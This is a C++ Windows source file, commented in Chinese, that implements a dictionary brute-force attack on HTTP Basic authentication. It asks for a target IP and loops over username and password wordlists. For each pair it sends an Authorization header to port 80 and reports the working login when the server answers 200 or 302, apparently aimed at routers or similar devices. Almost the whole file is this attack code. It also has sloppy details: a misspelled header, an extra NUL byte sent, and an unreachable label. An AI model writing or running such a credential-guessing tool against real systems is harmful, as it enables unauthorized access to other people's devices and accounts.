#include "stdafx.h"
#include <stdlib.h>
#include "ZBase64.h"
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <Winsock2.h>
using namespace std;
#pragma comment(lib,"ws2_32.lib")
int thr=10 ; //线程数
char CBase64Coder::ch64[] = {
'A','B','C','D','E','F','G','H','I','J','K','L','M','N',
'O','P','Q','R','S','T','U','V','W','X','Y','Z',
'a','b','c','d','e','f','g','h','i','j','k','l','m','n',
'o','p','q','r','s','t','u','v','w','x','y','z',
'0','1','2','3','4','5','6','7','8','9','+','/','='
};

CBase64Coder::CBase64Coder()
{
buf = NULL;
size = 0 ;
}

CBase64Coder::~CBase64Coder()
{
if ( buf )
free(buf);
}

void CBase64Coder::allocMem(int NewSize)
{
if ( buf )
buf = (char*)realloc(buf,NewSize);
else
buf = (char*)malloc(NewSize);
memset(buf,0,NewSize);
}

const char* CBase64Coder::encode(const char* buffer,int buflen)
{
int nLeft = 3 - buflen%3 ;
//根据BASE64算法，总长度会变成原来的4/3倍
//所以内存分配＝length*4/3并加1位作为结束符号(0)
allocMem(( buflen + nLeft )*4/3+1);
//临时变量，
char ch[4];
int i ,j;
for ( i = 0 ,j = 0; i < ( buflen - buflen%3 ); i += 3,j+= 4 )
{
ch[0] = (char)((buffer[i]&0xFC) >> 2 );
ch[1] = (char)((buffer[i]&0x03) << 4 | (buffer[i+1]&0xF0) >> 4 );
ch[2] = (char)((buffer[i+1]&0x0F) << 2 | (buffer[i+2]&0xC0) >> 6 );
ch[3] = (char)((buffer[i+2]&0x3F));
//查询编码数组获取编码后的字符
buf[j] = ch64[ch[0]];
buf[j+1] = ch64[ch[1]];
buf[j+2] = ch64[ch[2]];
buf[j+3] = ch64[ch[3]];
}

if ( nLeft == 2 )
{
ch[0] = (char)((buffer[i]&0xFC) >> 2);
ch[1] = (char)((buffer[i]&0x3) << 4 );
ch[2] = 64;
ch[3] = 64;

//查询编码数组获取编码后的字符
buf[j] = ch64[ch[0]];
buf[j+1] = ch64[ch[1]];
buf[j+2] = ch64[ch[2]];
buf[j+3] = ch64[ch[3]];
}
else if ( nLeft == 1 )
{
ch[0] = (char)((buffer[i]&0xFC) >> 2 );
ch[1] = (char)((buffer[i]&0x03) << 4 | (buffer[i+1]&0xF0) >> 4 );
ch[2] = (char)((buffer[i+1]&0x0F) << 2 );
ch[3] = 64;

//查询编码数组获取编码后的字符
buf[j] = ch64[ch[0]];
buf[j+1] = ch64[ch[1]];
buf[j+2] = ch64[ch[2]];
buf[j+3] = ch64[ch[3]];
}
return buf;
}

int CBase64Coder::BinSearch(char p)
{
if ( p >= 'A' && p <= 'Z' )
return (p - 'A');
else if ( p >= 'a' && p <= 'z' )
return (p - 'a' + 26);
else if ( p >= '0' && p <= '9' )
return (p - '0' + 26 + 26);
else if ( p == '+' )
return 62;
else if ( p == '/' )
return 63;
else if ( p == '=' )
return 64;
return -1;
}
int _tmain(int argc, _TCHAR* argv[])
{
string ip1="";
cout<<"输入目的主机IP:";
cin>>ip1;
const char *ip2=ip1.data();


fstream pwdfile;
pwdfile.open("password_dictionary.txt",ios::in);


char pwd[256];
char user[256];
while(!pwdfile.eof() )//逐行读取字典
{ 
pwdfile.getline(pwd,256,'\n');
// cout<<pwd;
fstream userfile;
userfile.open("username_dictionary.txt",ios::in);
while( !userfile.eof() )//逐行读取字典
{ 
userfile.getline(user,256,'\n');
//一个循环开始
CBase64Coder base64;

//string e=base64.encode(ip2,100);
//cout<<e<<endl;
string pwd2=pwd;
//cout<<pwd2<<endl;
string user2=user;
//cout<<user2<<endl;
string auth="";
auth.append(user2);
auth.append(":");
auth.append(pwd2);
const char *auth2=auth.data();
//cout<<auth<<endl;
//system("pause");

string auth_base=base64.encode(auth2,strlen(auth2));
//cout<<auth_base<<endl;

WSADATA wsaData;
if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
{
cout<<"找不到可使用的WinSock dll!"<<endl;
return 1;
}
SOCKET sClient=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(sClient==INVALID_SOCKET)
{
cout<<"创建客户端socket失败！"<<endl;
return 1;
}
SOCKADDR_IN addrServ;
addrServ.sin_family=AF_INET;
addrServ.sin_addr.S_un.S_addr=inet_addr(ip2);
addrServ.sin_port=htons(80);
if(connect(sClient,(sockaddr *)&addrServ,sizeof(sockaddr))==SOCKET_ERROR)
{
cout<<"连接服务器失败！"<<endl;
closesocket(sClient);
return 1;
}
//else
// cout<<"连接服务器成功！"<<endl;

//char * content = "index.php"; 
string str="";
str.append("GET /");
//str.append(content);
str.append(" HTTP/1.1");
str.append("\r\nHost:");
str.append(ip1);
//str.append("192.168.1.1");
str.append("\r\nProxy-Connection:Keep-Alive");
str.append("\r\nAuthorization: Basic ");
str.append(auth_base);
str.append("\r\nAccep:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
str.append("\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36 SE 2.X MetaSr 1.0");
str.append("\r\nAccept-Encoding: gzip,deflate,sdch");
str.append("\r\nAccept-Language: zh-CN,zh;q=0.8");
// str.append("\r\n");
// str.append("\r\n");
str.append("\r\n\r\n");
int retval=send(sClient,str.data(),str.length()+1,0);
if(retval==SOCKET_ERROR)
{
cout<<"发送数据失败！"<<endl;
}
//接收数据
for(int j=2;j>0;j--){
char buf[1024];
string b;
memset(buf,0,1024);
retval=recv(sClient,buf,1024,0);
if(retval==SOCKET_ERROR)
{
cout<<"接收数据失败！"<<endl;
}

// for(int i=0;i<1000;i++)
//printf("%c",buf[i]);
if(j==1){


if(buf[0]=='2' && buf[1]=='0' && buf[2]=='0'){
cout<<"_____________________________________________________________________________"<<endl;
cout<<"成功！"<<endl;
cout<<"_____________________________________________________________________________"<<endl;
cout<<"用户名："<<user2<<endl;
cout<<"密码："<<pwd2<<endl;
cout<<"_____________________________________________________________________________"<<endl;
cout<<"祝您愉快！"<<endl;
cout<<"_____________________________________________________________________________"<<endl;
goto A;
}
else if (buf[0]=='3' && buf[1]=='0' && buf[2]=='2'){
cout<<"用户名："<<user2<<endl;
cout<<"密码："<<pwd2<<endl;
cout<<"_____________________________________________________________________________"<<endl;
cout<<"祝您愉快！"<<endl;
cout<<"_____________________________________________________________________________"<<endl;
goto A;
}
else if (buf[0]=='4' && buf[1]=='0' && buf[2]=='1')
cout<<"已尝试账号"<<user2<<"密码"<<pwd2<<" 不是正确的用户名和密码"<<endl;
else 
cout<<"已尝试账号"<<user2<<"密码"<<pwd2<<" 在尝试过程中发生意外"<<"服务器返回"<<buf[0]<<buf[1]<<buf[2]<<endl;

}
}
//关闭套接字，释放资源
closesocket(sClient);
WSACleanup();
}
}
B:
cout<<"尝试完毕，字典中没有收录相应的用户名和密码组合"<<endl;
system("pause");
return 0;
A:

system("pause");
return 0;
}
